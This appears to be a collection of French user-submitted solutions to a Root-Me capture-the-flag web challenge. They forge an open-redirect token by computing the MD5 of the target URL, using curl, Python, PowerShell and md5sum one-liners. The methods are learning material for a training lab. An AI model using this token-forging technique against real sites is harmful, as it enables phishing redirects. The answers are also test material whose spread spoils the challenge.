@@ -1,0 +1,113 @@
+Je ne vais pas réexpliquer les explications et analyse du challenge d’autres l’ont très bien fait.
+Je vais proposer une solution avec cURL :
+curl -G http://challenge01.root-me.org/web-serveur/ch52/ -d "url=https://google.fr&h=0edf27c83d4aa4699c0625d27be0e371" -o rootme.txt
+
+L’option -G avec -d permet d’envoyer d’envoyer des données en ’GET’, l’option -o pour enregistrer le résultat dans un fichier, ici texte.
+Plus qu’à ouvrir le fichier de sorti et on peut y voir le flag dedans ;)
+
+ou
+
+
+
+Je ne vais pas reprendre les explications des autres solutions, vous l’aurez compris la variable h doit contenir le hash MD5 de l’URL vers laquelle on souhaite rediriger.
+La redirection se fait très rapidement donc il n’est pas facile de copier/coller et je n’avais pas envie d’utiliser du code ou des outils de sniffing.
+
+Pour avoir le temps de copier/coller le code de validation, utilisez une URL qui va générer un timeout (par exemple un nom de domaine invalide ou un service que ne répond pas). Pour ma part, j’ai utilisé celle-ci :
+http://challenge01.root-me.org/web-serveur/ch52/?url=https://azertyuiop.com&h=f9338862dd8738de9174ec5112808d79
+
+ou
+
+ Analyse
+
+Déjà, une fois sur la page du challenge on remarque que nous ne pouvons que nous rediriger vers des sites pré-choisis.
+On regarde vite-fait le code HTML/CSS de la page, et on voit :
+
+<a href='?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134'>facebook</a>
+
+Bon, à partir de là, on sait qu’on doit s’amuser avec les redirections par une requête de type GET, on sait qu’on doit le faire sur un autre site, mais un paramètre bloque : le &h.
+A vu de nez on se dit que c’est le MD5 du paramètre url.
+Et comme dit dans l’énoncé : "Trouvez un moyen de faire une redirection vers un domaine autre que ceux proposés sur la page web.", donc le choix ne notre page web qui servira de redirection importe peu
+Exploitation
+
+On code un petit programme en python :
+
+    #!/usr/bin/env python2
+    # -*- coding: ascii -*-
+    import requests
+    import re
+    import hashlib
+     
+    h = hashlib.md5()
+    h.update("1")
+    page = "http://challenge01.root-me.org/web-serveur/ch52/index.php?"
+    url = page + "url=1&h=" + h.hexdigest()
+    resultat=requests.get(url)
+    r = resultat.text
+    if r.find('flag') != -1:
+            print(r)
+
+ou
+
+Bon je vais pas réinventer le monde avec ma solution, mais elle permet de figer la fenêtre avec le flag :
+
+Donc je fais une redirection de facebook vers google (comme beaucoup) et je hash tout ce petit monde :
+
+MD5 decode : https://facebook.com:returnUrl=http://google.fr
+
+et le Hash :
+3494f10644e5315c4ad66ba9cc98a00e
+
+Ce qui donne l’url suivante :
+
+http://challenge01.root-me.org/web-serveur/ch52/?url=https://facebook.com:returnUrl=http://google.fr&h=3494f10644e5315c4ad66ba9cc98a00e
+
+Et paf le flag reste affiché à l’écran !! 😇
+
+ou
+
+Je vais proposer une solution avec PowerShell :
+
+PS V:\> Invoke-WebRequest -Uri "http://challenge01.root-me.org/web-serveur/ch52/?url=https://hookb.in/KNRRnPOx&h=ef55e3500dc257c794ccde7f3259436c" | Select-Object -ExpandProperty Content
+
+Fonctionne avec Powershell 3.0+, Invoke-WebRequest est ce qu’il y a de plus proche de cURL sous Windows.
+
+ou
+
+Méthode à l’arrache comme on dit chez moi ...
+
+J’ai regardé la source, dans les liens on observe un facebook
+
+Un petit tour sur md5 Hash Generator (http://www.miraclesalad.com/webtools/md5.php)
+
+Je test si https://facebook.com == a023cfbf5f1c39bdf8407f28b60cd134
+
+C’est le cas, il ne me reste plus qu’à faire la somme md5 de https://google.fr ce qui donne : 0edf27c83d4aa4699c0625d27be0e371
+
+J’ai saisi l’url suivante dans mon navigateur : http://challenge01.root-me.org/web-serveur/ch52/?url=https://google.fr&h=0edf27c83d4aa4699c0625d27be0e371
+
+La page suivante nous affiche le flag mais juste une seconde alors comme je l’ai précisé c’est une solution à l’arrache :)
+
+J’ai fais un imprime écran et j’ai recopié le flag à la main.
+
+ou
+
+Les liens dans la page pointent sur différentes ressources, avec un token de vérification dans l’url, différencié par site. Ce token va servir côté serveur à valider que la destination émane bien de sa page.
+http://challenge01.root-me.org/web-serveur/ch52/?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134
+
+En l’occurence notre token a une longueur de 32 caractères :
+
+echo -n a023cfbf5f1c39bdf8407f28b60cd134 | wc
+      0       1      32
+
+On pense en conséquence évidemment à un MD5, qu’on retrouve facilement :
+
+echo -n "https://facebook.com" | md5sum
+a023cfbf5f1c39bdf8407f28b60cd134  -
+
+Il suffit alors de crafter une URL appropriée car on connaît le ’secret’ du serveur :
+
+echo -n "http://challenge01.root-me.org/web-serveur/ch52/?url=https://whatever.com&h="$(echo -n "https://whatever.com" | md5sum)
+http://challenge01.root-me.org/web-serveur/ch52/?url=https://whatever.com&h=aed197d417d4faf8ba051133b3ab2fa9 
+
+ou
+
